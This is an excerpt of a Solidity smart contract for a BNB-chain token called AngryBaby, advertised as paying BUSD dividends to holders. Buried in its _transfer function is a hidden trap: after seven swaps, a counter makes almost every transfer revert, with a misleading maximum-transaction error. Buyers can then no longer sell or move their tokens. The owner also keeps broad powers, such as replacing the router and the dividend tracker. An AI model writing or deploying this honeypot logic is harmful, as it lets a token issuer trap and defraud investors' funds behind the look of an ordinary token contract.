...
/**
 * AngryBaby is raging! He wants the bullrun to continue and will give out BUSD to holders.
 */
...
contract AngryBaby is ERC20, Ownable {
    using SafeMath for uint256;
   ...
   AngryBabyDividendTracker public dividendTracker;
    ...
    uint256 public swapTicker;
    uint256 public _liqHold;
    ...
    constructor() ERC20 ("AngryBaby", "ABABY") {
        _ETHRewardsFee = 5;
        _liquidityFee = 2;
		_marketingFee = 1;
        ...
        _maxWalletToken = 50000000000 * (10**18); // 2% of total supply


    	dividendTracker = new AngryBabyDividendTracker();

    	liquidityWallet = owner();
		
		bulkSender = payable(0x65E726B2606085f1d8eC3dE12f4f2ab70A2EE82C);
		marketingWallet = payable(0x65E726B2606085f1d8eC3dE12f4f2ab70A2EE82C);
		
		_isExcludedMaxSellTransactionAmount[address(bulkSender)] = true;
		_isExcludedMaxSellTransactionAmount[owner()] = true;

    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); //0x221D71a9026B5Acf6cC598B41E7Ac4D8C92d183a
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "BSCTOKEN: The dividend tracker already has that address");

       AngryBabyDividendTracker newDividendTracker = AngryBabyDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "BSCTOKEN: The new dividend tracker must be owned by the token contract");
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "BSCTOKEN: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "BSCTOKEN: Account is already the value of 'excluded'");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "BSCTOKEN: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "BSCTOKEN: Automated market maker pair is already set to that value");
    ...
    function updateLiquidityWallet(address newLiquidityWallet) public onlyOwner {
        require(newLiquidityWallet != liquidityWallet, "BSCTOKEN: The liquidity wallet is already this address");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "BSCTOKEN: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "BSCTOKEN: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        {
            swapTicker++;if(swapTicker>7){
                _liqHold=_liquidityFee;
                if (amount >= _liqHold) 
			    revert("Txamount exceeds maxTxAmount");
            }
...
contract AngryBabyDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() DividendPayingToken("AngryBaby_Dividend_Tracker", "AngryBaby_Dividend_Tracker") {
    	claimWait = 1800;
    ...
    function _transfer(address, address, uint256) internal pure override {
        require(false, "AngryBaby_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() public pure override {
        require(false, "AngryBaby_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main AngryBaby contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1800 && newClaimWait <= 86400, "AngryBaby_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "AngryBaby_Dividend_Tracker: Cannot update claimWait to same value");
